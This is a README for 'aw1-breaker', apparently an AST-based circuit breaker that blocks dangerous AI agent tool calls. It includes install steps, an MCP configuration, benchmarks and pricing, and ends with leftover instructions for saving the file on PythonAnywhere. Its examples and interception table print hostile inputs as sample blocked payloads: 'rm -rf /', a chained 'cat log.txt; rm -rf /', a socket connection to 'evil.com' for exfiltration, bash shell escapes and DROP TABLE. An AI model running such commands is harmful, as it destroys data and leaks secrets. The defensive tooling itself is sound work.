Markdown# aw1-breaker (v2.0.1)

[![HOL Verified](https://img.shields.io/badge/HOL-Source_Verified-10B981?style=for-the-badge&logo=shield)](https://hol.org/blog/stopping-rogue-agents-inside-the-ast-breaker)
[![PyPI](https://img.shields.io/pypi/v/aw1-circuit-breaker?color=blue&style=for-the-badge)](https://pypi.org/project/aw1-circuit-breaker/)
[![Zero Dependencies](https://img.shields.io/badge/Runtime_Dependencies-Zero_(Standard_Lib)-blueviolet?style=for-the-badge)](#)
[![Glama Score](https://glama.ai/mcp/servers/MvikManners/aw1-circuit-breaker/badges/score.svg)](https://glama.ai/mcp/servers/MvikManners/aw1-circuit-breaker)
[![License: Apache-2.0](https://img.shields.io/badge/License-Apache_2.0-green.svg)](LICENSE)
[![Latency](https://img.shields.io/badge/AST%20Evaluation-%3C0.2ms-brightgreen.svg)](#)

> **Featured on Hashgraph Online (HOL):** Read the independent source-level teardown: [*What aw1-breaker 2.0.0 checks before a tool call*](https://hol.org/blog/stopping-rogue-agents-inside-the-ast-breaker).

`aw1-breaker` is a zero-dependency Python security circuit breaker that intercepts autonomous AI agent tool calls in sub-millisecond execution loops using Abstract Syntax Tree (AST) decompilation, per-actor rolling velocity monitors, and cryptographically signed HMAC execution tokens.

---

## ⚡ 10-Second Test Drive (Zero-Install)

Test the circuit breaker live in your terminal without installing anything:

```bash
uvx aw1-circuit-breaker --demo
Or verify an arbitrary snippet:Bashuvx aw1-circuit-breaker verify "subprocess.run(['rm', '-rf', '/'])"
📦 InstallationBashpip install aw1-circuit-breaker
(Zero external dependencies. Pure Python standard library: Python 3.10 to 3.13).🛡️ Enterprise Guard (Turnkey 3-Line Integration)Drop enterprise boundary policies directly onto agent tools using the @guard.protect decorator:Pythonfrom aw1 import EnterpriseGuard, SecurityViolationError

guard = EnterpriseGuard(
    allowed_tools=["safe_query", "fetch_market_data"],
    max_velocity_per_min=60,
    max_financial_limit=250.0,
    readonly_sql=True
)

@guard.protect(tool_name="safe_query")
def execute_database_query(query: str):
    return db.execute(query)

# Benign queries execute instantly (< 0.2ms)
execute_database_query("SELECT id FROM users LIMIT 1;")

# Adversarial AST injections & SQL drops are halted deterministically
# -> Raises SecurityViolationError: "Database mutation rejected under readonly_sql policy"
🔌 Model Context Protocol (MCP) ServerRun directly with Python:Bashpython mcp_server.py
Or via uvx:Bashuvx mcp_server.py
MCP Client ConfigurationAdd to your Claude Desktop or Cursor configuration:JSON{
  "mcpServers": {
    "aw1-circuit-breaker": {
      "command": "python",
      "args": ["mcp_server.py"]
    }
  }
}
⚔️ Exploit Interception in ActionAW-1 operates deterministically at the Abstract Syntax Tree (AST) level before code reaches Python's runtime execution frame. Probabilistic prompt-based guardrails fail under encoding obfuscation; AST inspection guarantees deterministic enforcement.Interception MatrixAttack VectorAttacker StrategyLLM Guardrail ResultAW-1 AST Circuit BreakerDynamic Executioneval(compile(...))Evades semantic filters🛑 Tripped (RESTRICTED_INVOCATION)Shell Escapessubprocess.Popen(['bash', ...])Masked as system task🛑 Tripped (UNAUTHORIZED_MODULE_IMPORT)Lateral Exfiltrationsocket.connect(('evil.com', 443))Disguised as HTTP fetch🛑 Tripped (UNAUTHORIZED_MODULE_IMPORT)SQL DestructionDROP TABLE users;Prompt jailbreak bypass🛑 Tripped (HALT_SQL_MUTATION_FORBIDDEN)Run the ShowcaseBashpython examples/enterprise_guard_demo.py
⏱️ Runtime Latency TelemetryDeterministic security must not throttle agent execution. AW-1 operates with sub-millisecond AST parsing and microsecond-scale argument filtering across warm execution loops.Sample Size: 1,000 synthetic iterations per test vector on Debian Python 3.13.Evaluation Targetp50 Latencyp95 Latencyp99 LatencyStatusAST Inspection (Benign Payload)0.0889 ms0.1298 ms0.1645 ms< 0.2 ms OverheadAST Inspection (Adversarial Exploit)0.0520 ms0.0919 ms0.1051 msInstant Breakout HaltShell Argument Injection Guard0.0051 ms0.0096 ms0.0195 msSub-20 µs InspectionReproduce locally:Bashpython benchmark.py
🧩 Framework Integration (LangGraph Example)AW-1 drops directly into autonomous agent execution nodes prior to tool dispatch:Pythonfrom examples.langgraph_adapter import execute_agent_action, CircuitBreakerException

# Guard autonomous agent tool dispatches
try:
    execute_agent_action(bash_tool, "bash_tool", {"cmd": "cat log.txt; rm -rf /"})
except CircuitBreakerException as blocked:
    print(f"Tool call halted: {blocked}")
🌐 Production Cloud API & Quota UpgradesDeploying autonomous agents in production? Route your tool dispatch loops through our hosted API gateway with sub-0.2ms deterministic AST inspection:PlanPricing (USD / BWP)Quota & FeaturesAccess / CheckoutDeveloper SandboxFree10,000 requests, HMAC token mintingCode HOL-BREAKER-2026Developer Pro$49 / BWP 650 /mo100,000 audit requests, 1 license key, offline HMAC validationUpgrade to ProTeam / Startup$199 / BWP 2,650 /mo1,000,000 audit requests, 5 seat keys, Redis state syncUpgrade to TeamEnterprise Dedicated$990 / BWP 13,200 /moUnlimited seats, dedicated gateway tenant, custom statutory lensesEnterprise DeskTo activate enterprise quotas, pass your signed bearer token in the Authorization header:Bashcurl -X POST [https://p20.laveto.net/wisdom/api/v1/intercept](https://p20.laveto.net/wisdom/api/v1/intercept) \
  -H "Authorization: Bearer AW1-EXEC-TOKEN-..." \
  -H "Content-Type: application/json" \
  -d '{"actor_id": "prod-agent-01", "tool_name": "db_query", "payload": "SELECT 1;"}'
LicenseLicensed under the Apache License, Version 2.0. See LICENSE for details.
---

### Easiest Way to Apply This (Zero Terminal Buffering Issues)

1. Open your **PythonAnywhere dashboard** in your browser.
2. Click the **Files** tab at the top.
3. Navigate to: `/home/LavetoLab/aw1-breaker/README.md`.
4. Click to open it in the built-in browser editor.
5. Select everything (`Ctrl + A`), hit delete, copy the entire block above, and paste it in.
6. Click the yellow **Save** button in the top right.
7. Return to your Bash console and run this single sync command:
   ```bash
   cd /home/LavetoLab/aw1-breaker && git add README.md && git commit -m "docs: finalize complete unified README" && git push origin main
